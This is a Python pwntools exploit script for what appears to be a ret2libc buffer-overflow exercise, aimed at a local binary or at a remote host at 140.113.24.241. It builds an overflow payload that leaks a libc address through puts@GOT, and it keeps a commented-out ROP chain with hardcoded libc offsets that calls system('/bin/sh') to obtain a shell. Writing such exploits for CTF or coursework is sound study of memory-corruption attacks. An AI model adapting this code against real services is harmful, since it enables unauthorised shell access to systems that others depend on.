from pwn import *

###################
### CONNECTION ####
###################
LOCAL = True
REMOTETCP = False
GDB = True

LOCAL_BIN = "../../source/ret2libc/ret2libc"

if LOCAL:
    proc = process(LOCAL_BIN)
    elf = ELF(LOCAL_BIN)
    libc = elf.libc
    ROP_LOADED = ROP(elf)
elif REMOTETCP:
    proc = remote("140.113.24.241", 30173)
    elf = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(elf)

if GDB and LOCAL:
    context.terminal = ['tmux', 'splitw', '-h']
    gdb.attach(proc)

###################
###   PAYLOAD  ####
###################

# 0x000000000002a3e5: pop rdi; ret;
# 0x00000000001d8678: /bin/sh
# 0x0000000000050d70: system
# 0x00000000000455f0: exit

# 0x00007ffff7d87000: libc base
# 0x000000000040115e: ret


LIBC_BASE = 0x00007ffff7d87000
RET = 0x40115e
POP_RDI = LIBC_BASE + 0x000000000002a3e5
BIN_SH = LIBC_BASE + 0x00000000001d8678
SYSTEM = LIBC_BASE + 0x0000000000050d70
EXIT = LIBC_BASE + 0x00000000000455f0

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main_addr = elf.symbols['main']

payload = flat(
    b"X" * (128 + 8),
    pwnlib.util.packing.p64(puts_plt),
    pwnlib.util.packing.p64(main_addr),
    pwnlib.util.packing.p64(puts_got),
)

# payload = b"".join([
#     b"X" * (128 + 8),
#     pwnlib.util.packing.p64(RET),
#     pwnlib.util.packing.p64(POP_RDI),
#     pwnlib.util.packing.p64(BIN_SH),
#     pwnlib.util.packing.p64(SYSTEM),
#     pwnlib.util.packing.p64(EXIT),
# ])

proc.clean()
proc.sendline(payload)
# proc.sendline(rop.chain())
# leaked = proc.recvline()[:8].strip()
# print(leaked)
proc.interactive()
